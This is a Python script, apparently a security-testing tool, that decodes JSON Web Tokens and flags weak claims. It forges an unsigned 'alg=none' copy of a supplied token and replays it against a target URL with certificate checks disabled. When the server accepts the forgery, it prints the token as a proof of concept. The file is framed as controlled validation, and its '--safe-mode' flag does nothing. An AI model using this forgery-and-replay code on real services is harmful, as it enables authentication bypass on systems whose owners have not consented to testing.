#!/usr/bin/env python3
"""
Analyze JWTs and generate safe attack variants.

The script decodes JWT headers/claims without trusting them, flags weak claims,
creates an alg=none variant for controlled validation, and can optionally call a
target URL with supplied token variants. A positive result requires the target
accepting a forged/unsigned/expired token or weak claim set.
"""
import argparse
import base64
import json
import ssl
import sys
import time
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"


def b64url_decode(part):
    part += "=" * (-len(part) % 4)
    return base64.urlsafe_b64decode(part.encode())


def b64url_encode(raw):
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def parse_jwt(token):
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("JWT must have three dot-separated parts")
    header = json.loads(b64url_decode(parts[0]).decode("utf-8", "replace"))
    claims = json.loads(b64url_decode(parts[1]).decode("utf-8", "replace"))
    return header, claims, parts


def none_variant(claims):
    header = {"typ": "JWT", "alg": "none"}
    return f"{b64url_encode(json.dumps(header, separators=(',', ':')).encode())}.{b64url_encode(json.dumps(claims, separators=(',', ':')).encode())}."


def call(url, token, timeout):
    req = Request(url, headers={"User-Agent": "prod-sec-jwt-attack/1.0", "Authorization": f"Bearer {token}"})
    try:
        with urlopen(req, timeout=timeout, context=ssl._create_unverified_context()) as resp:
            return resp.status, resp.read(1000).decode("utf-8", "replace"), None
    except HTTPError as exc:
        return exc.code, exc.read(1000).decode("utf-8", "replace"), None
    except (URLError, TimeoutError, ssl.SSLError) as exc:
        return 0, "", str(exc)


def main():
    parser = argparse.ArgumentParser(description="Analyze JWT and generate safe validation variants.")
    parser.add_argument("target", help="JWT token, or target URL when --token is provided.")
    parser.add_argument("--token", help="JWT token if positional target is a URL.")
    parser.add_argument("--safe-mode", action="store_true", help="Do not brute force secrets; only decode and generate variants.")
    parser.add_argument("--timeout", type=float, default=8)
    args = parser.parse_args()

    token = args.token or args.target
    target_url = args.target if args.token else None
    findings = []
    try:
        header, claims, _ = parse_jwt(token)
    except Exception as exc:
        print(f"{RED}[ERROR]{RESET} {exc}")
        print("JSON_SNIPPET:", json.dumps({"tool": "jwt_attack", "target": args.target, "error": str(exc)}))
        return 2

    print(f"{GREEN}[HEADER]{RESET} {json.dumps(header, sort_keys=True)}")
    print(f"{GREEN}[CLAIMS]{RESET} {json.dumps(claims, sort_keys=True)}")

    alg = str(header.get("alg", "")).lower()
    now = int(time.time())
    if alg in ("none", ""):
        findings.append({"title": "JWT uses unsafe algorithm", "severity": "Critical", "evidence": f"alg={header.get('alg')}"})
    if "exp" not in claims:
        findings.append({"title": "JWT missing exp claim", "severity": "High", "evidence": "No expiration claim"})
    elif isinstance(claims.get("exp"), int) and claims["exp"] < now:
        findings.append({"title": "Expired JWT supplied", "severity": "Info", "evidence": f"exp={claims['exp']}"})
    for required in ("iss", "aud"):
        if required not in claims:
            findings.append({"title": f"JWT missing {required} claim", "severity": "Medium", "evidence": f"{required} absent"})
    if "kid" in header and (".." in str(header["kid"]) or str(header["kid"]).startswith("/")):
        findings.append({"title": "Suspicious JWT kid header", "severity": "High", "evidence": str(header["kid"])})

    forged = none_variant(claims)
    print(f"{YELLOW}[VARIANT]{RESET} alg=none token for controlled validation:")
    print(forged)

    if target_url:
        base_status, _, base_err = call(target_url, token, args.timeout)
        forged_status, _, forged_err = call(target_url, forged, args.timeout)
        print(f"{GREEN}[CALL]{RESET} original status={base_status} error={base_err or '-'}")
        print(f"{GREEN}[CALL]{RESET} none-variant status={forged_status} error={forged_err or '-'}")
        if forged_status and forged_status == base_status and forged_status < 400:
            findings.append({"title": "Target may accept unsigned JWT", "severity": "Critical", "evidence": f"alg=none variant returned HTTP {forged_status}", "poc": forged})

    print("JSON_SNIPPET:", json.dumps({"tool": "jwt_attack", "target": args.target if target_url else "token", "findings": findings, "decoded": {"header": header, "claims": claims}}, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
